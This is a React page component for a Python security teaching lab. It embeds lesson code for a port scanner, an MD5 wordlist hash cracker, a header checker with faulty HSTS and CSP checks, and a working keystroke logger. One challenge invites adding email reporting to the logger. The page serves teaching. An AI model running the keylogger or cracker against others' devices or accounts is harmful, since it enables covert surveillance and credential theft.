import { useState } from 'react';
import { motion } from 'framer-motion';
import { Play, Code, BookOpen, Terminal, Shield, Zap, AlertTriangle, CheckCircle, Copy, Download } from 'lucide-react';
import { Link } from 'react-router-dom';

const Python = () => {
  const [activeTab, setActiveTab] = useState('basics');
  const [copiedCode, setCopiedCode] = useState(null);

  const copyToClipboard = async (code, index) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(index);
      setTimeout(() => setCopiedCode(null), 2000);
    } catch (err) {
      console.error('Failed to copy: ', err);
    }
  };

  const lessons = {
    basics: [
      {
        title: "Basic Port Scanner",
        description: "Learn socket programming by building a simple port scanner",
        difficulty: "Beginner",
        tags: ["Networking", "Sockets", "Scanning"],
        code: `import socket
import sys

def port_scanner(target, start_port, end_port):
    print(f"Scanning {target} from port {start_port} to {end_port}")

    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"Port {port}: OPEN")
            sock.close()
        except KeyboardInterrupt:
            print("\\nExiting...")
            sys.exit()
        except socket.error:
            pass

# Usage
target_host = "scanme.nmap.org"
start_port = 20
end_port = 100
port_scanner(target_host, start_port, end_port)`,
        challenge: "Modify the scanner to use threading for faster scanning",
        prerequisites: ["Basic Python knowledge", "Understanding of TCP/IP"]
      },
      {
        title: "Password Hash Cracker",
        description: "Brute-force crack MD5 hashes using a wordlist",
        difficulty: "Intermediate",
        tags: ["Cryptography", "Hashing", "Security"],
        code: `import hashlib
import sys

def crack_hash(hash_to_crack, wordlist_file):
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            word = line.strip()
            hashed_word = hashlib.md5(word.encode()).hexdigest()
            if hashed_word == hash_to_crack:
                return word
    return None

# Usage
target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 of "password"
wordlist = "rockyou.txt"

cracked = crack_hash(target_hash, wordlist)
if cracked:
    print(f"Password found: {cracked}")
else:
    print("Password not found in wordlist")`,
        challenge: "Add support for SHA256 hashes and progress reporting",
        prerequisites: ["File I/O", "Hash functions"]
      }
    ],
    advanced: [
      {
        title: "Web Scraper for Security Headers",
        description: "Check websites for security headers using requests and BeautifulSoup",
        difficulty: "Advanced",
        tags: ["Web Security", "HTTP", "Headers"],
        code: `import requests
from urllib.parse import urlparse

def check_security_headers(url):
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers

        security_checks = {
            'Strict-Transport-Security': 'HSTS' in headers,
            'Content-Security-Policy': 'CSP' in headers,
            'X-Frame-Options': 'X-Frame-Options' in headers,
            'X-Content-Type-Options': 'X-Content-Type-Options' in headers,
            'Referrer-Policy': 'Referrer-Policy' in headers
        }

        print(f"Security headers for {url}:")
        for header, present in security_checks.items():
            status = "✓" if present else "✗"
            print(f"{status} {header}")

    except requests.RequestException as e:
        print(f"Error: {e}")

# Usage
check_security_headers("https://github.com")`,
        challenge: "Create a CSV report for multiple websites",
        prerequisites: ["HTTP knowledge", "Web scraping basics"]
      },
      {
        title: "Simple Keylogger (Educational)",
        description: "Build a basic keylogger using pynput (for educational purposes only)",
        difficulty: "Advanced",
        tags: ["System Monitoring", "Ethics", "Logging"],
        code: `from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\\n")
        else:
            logging.info(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Note: This is for educational purposes only.
# Never use keyloggers without explicit permission.`,
        challenge: "Add email reporting functionality (ethically)",
        prerequisites: ["System programming", "Ethical considerations"]
      }
    ]
  };

  return (
    <>
      {/* Background Effects */}
      <div className="fixed inset-0 bg-[radial-gradient(circle_at_20%_30%,rgba(0,168,204,0.08),transparent_50%)] pointer-events-none" />
      <div className="fixed inset-0 bg-[radial-gradient(circle_at_80%_70%,rgba(45,106,79,0.06),transparent_50%)] pointer-events-none" />

      {/* Navigation */}
      <nav className="relative z-10 bg-slate-900/90 backdrop-blur-xl border-b border-slate-800/50 sticky top-0">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
            <div className="flex items-center gap-4">
              <Link to="/dashboard" className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 shadow-lg">
                <Shield className="h-5 w-5 text-white" />
              </Link>
              <div>
                <h1 className="text-lg font-bold text-white">Zoderise</h1>
                <p className="text-xs text-slate-400">Python Security Laboratory</p>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-6">
              <Link to="/dashboard" className="text-slate-300 hover:text-white transition-colors">Dashboard</Link>
              <Link to="/study" className="text-slate-300 hover:text-white transition-colors">Study</Link>
              <Link to="/quiz" className="text-slate-300 hover:text-white transition-colors">Quiz</Link>
              <Link to="/python" className="text-cyan-400 hover:text-cyan-300 transition-colors font-medium">Python Lab</Link>
              <Link to="/kali" className="text-slate-300 hover:text-white transition-colors">Kali Tools</Link>
              <Link to="/phishing" className="text-slate-300 hover:text-white transition-colors">Phishing</Link>
              <Link to="/password-checker" className="text-slate-300 hover:text-white transition-colors">Password</Link>
              <Link to="/upgrade" className="text-slate-300 hover:text-white transition-colors">Upgrade</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="relative z-10 max-w-7xl mx-auto px-6 py-8">
        {/* Header Section */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="mb-10"
        >
          <div className="flex items-center gap-4 mb-6">
            <div className="h-12 w-12 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg">
              <Terminal className="h-6 w-6 text-white" />
            </div>
            <div>
              <h1 className="text-4xl font-bold text-white">Python Security Laboratory</h1>
              <p className="text-slate-400 text-lg mt-2">Master cybersecurity scripting through hands-on Python development</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
            <div className="bg-gradient-to-br from-slate-800/50 to-slate-900/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-4">
              <div className="flex items-center gap-3">
                <Code className="h-5 w-5 text-cyan-400" />
                <span className="text-slate-300 text-sm">Interactive Code Examples</span>
              </div>
            </div>
            <div className="bg-gradient-to-br from-slate-800/50 to-slate-900/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-4">
              <div className="flex items-center gap-3">
                <Shield className="h-5 w-5 text-green-400" />
                <span className="text-slate-300 text-sm">Security-Focused Learning</span>
              </div>
            </div>
            <div className="bg-gradient-to-br from-slate-800/50 to-slate-900/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-4">
              <div className="flex items-center gap-3">
                <Zap className="h-5 w-5 text-yellow-400" />
                <span className="text-slate-300 text-sm">Real-World Applications</span>
              </div>
            </div>
          </div>
        </motion.div>

        {/* Tab Navigation */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.1 }}
          className="flex gap-2 mb-8 p-1 bg-slate-800/50 rounded-xl backdrop-blur-sm border border-slate-700/50 w-fit"
        >
          <button
            onClick={() => setActiveTab('basics')}
            className={`px-6 py-3 rounded-lg font-medium transition-all duration-200 ${
              activeTab === 'basics'
                ? 'bg-gradient-to-r from-cyan-600 to-blue-600 text-white shadow-lg'
                : 'text-slate-300 hover:text-white hover:bg-slate-700/50'
            }`}
          >
            Basic Tools
          </button>
          <button
            onClick={() => setActiveTab('advanced')}
            className={`px-6 py-3 rounded-lg font-medium transition-all duration-200 ${
              activeTab === 'advanced'
                ? 'bg-gradient-to-r from-cyan-600 to-blue-600 text-white shadow-lg'
                : 'text-slate-300 hover:text-white hover:bg-slate-700/50'
            }`}
          >
            Advanced Scripts
          </button>
        </motion.div>

        {/* Lessons Grid */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="grid grid-cols-1 xl:grid-cols-2 gap-6 mb-12"
        >
          {lessons[activeTab].map((lesson, index) => (
            <div key={index} className="bg-gradient-to-br from-slate-800/50 to-slate-900/50 backdrop-blur-sm border border-slate-700/50 rounded-xl overflow-hidden shadow-xl hover:border-slate-600/50 transition-colors">
              <div className="p-6">
                <div className="flex items-start justify-between mb-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-2">
                      <span className={`px-2 py-1 rounded text-xs font-medium ${
                        lesson.difficulty === 'Beginner' ? 'bg-green-500/20 text-green-400' :
                        lesson.difficulty === 'Intermediate' ? 'bg-yellow-500/20 text-yellow-400' :
                        'bg-red-500/20 text-red-400'
                      }`}>
                        {lesson.difficulty}
                      </span>
                      <div className="flex gap-1">
                        {lesson.tags.map((tag, tagIndex) => (
                          <span key={tagIndex} className="px-2 py-1 bg-slate-700/50 rounded text-xs text-slate-400">
                            {tag}
                          </span>
                        ))}
                      </div>
                    </div>
                    <h3 className="text-xl font-semibold text-white mb-2">{lesson.title}</h3>
                    <p className="text-slate-400 text-sm leading-relaxed">{lesson.description}</p>
                  </div>
                </div>

                {/* Prerequisites */}
                <div className="mb-4">
                  <h4 className="text-sm font-medium text-slate-300 mb-2">Prerequisites:</h4>
                  <div className="flex flex-wrap gap-2">
                    {lesson.prerequisites.map((prereq, prereqIndex) => (
                      <span key={prereqIndex} className="px-2 py-1 bg-slate-700/30 rounded text-xs text-slate-400">
                        {prereq}
                      </span>
                    ))}
                  </div>
                </div>

                {/* Code Block */}
                <div className="bg-slate-950/50 border border-slate-700/50 rounded-lg overflow-hidden mb-4">
                  <div className="flex items-center justify-between px-4 py-3 bg-slate-800/50 border-b border-slate-700/50">
                    <span className="text-slate-400 text-sm font-medium">Python Code</span>
                    <button
                      onClick={() => copyToClipboard(lesson.code, index)}
                      className="flex items-center gap-2 px-3 py-1 bg-slate-700/50 hover:bg-slate-600/50 rounded text-xs text-slate-300 hover:text-white transition-colors"
                    >
                      {copiedCode === index ? <CheckCircle className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                      {copiedCode === index ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                  <pre className="p-4 text-cyan-400 text-sm overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed">
                    <code>{lesson.code}</code>
                  </pre>
                </div>

                {/* Challenge */}
                <div className="bg-gradient-to-r from-slate-800/50 to-slate-900/50 border border-slate-700/50 rounded-lg p-4">
                  <h4 className="text-white font-medium mb-2 flex items-center gap-2">
                    <BookOpen className="h-4 w-4 text-cyan-400" />
                    Challenge
                  </h4>
                  <p className="text-slate-300 text-sm">{lesson.challenge}</p>
                </div>
              </div>
            </div>
          ))}
        </motion.div>

        {/* Getting Started Section */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.3 }}
          className="bg-gradient-to-br from-slate-800/50 to-slate-900/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6 shadow-xl"
        >
          <div className="flex items-center gap-3 mb-6">
            <div className="h-10 w-10 bg-gradient-to-br from-green-500 to-emerald-600 rounded-lg flex items-center justify-center">
              <Play className="h-5 w-5 text-white" />
            </div>
            <h2 className="text-2xl font-semibold text-white">Getting Started</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-4">
              <div className="flex items-start gap-3">
                <div className="h-6 w-6 bg-cyan-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                  <span className="text-cyan-400 text-sm font-bold">1</span>
                </div>
                <div>
                  <p className="text-slate-300 text-sm">Install Python 3.8+ from</p>
                  <a href="https://python.org" className="text-cyan-400 hover:text-cyan-300 text-sm underline">python.org</a>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className="h-6 w-6 bg-cyan-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                  <span className="text-cyan-400 text-sm font-bold">2</span>
                </div>
                <div>
                  <p className="text-slate-300 text-sm mb-1">Install required packages:</p>
                  <code className="bg-slate-950/50 px-3 py-2 rounded text-cyan-400 text-sm font-mono block">
                    pip install requests beautifulsoup4 pynput
                  </code>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className="h-6 w-6 bg-cyan-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                  <span className="text-cyan-400 text-sm font-bold">3</span>
                </div>
                <div>
                  <p className="text-slate-300 text-sm mb-1">Create a virtual environment:</p>
                  <code className="bg-slate-950/50 px-3 py-2 rounded text-cyan-400 text-sm font-mono block">
                    python -m venv venv && venv\\Scripts\\activate
                  </code>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div className="flex items-start gap-3">
                <div className="h-6 w-6 bg-cyan-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                  <span className="text-cyan-400 text-sm font-bold">4</span>
                </div>
                <p className="text-slate-300 text-sm">Run the scripts and experiment with the code</p>
              </div>

              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="h-5 w-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-yellow-400 text-sm font-medium mb-1">Important Security Notice</p>
                    <p className="text-yellow-200 text-sm">
                      Use these tools responsibly and only on systems you own or have explicit permission to test.
                      Unauthorized use may violate laws and ethical guidelines.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      </div>
    </>
  );
};

export default Python;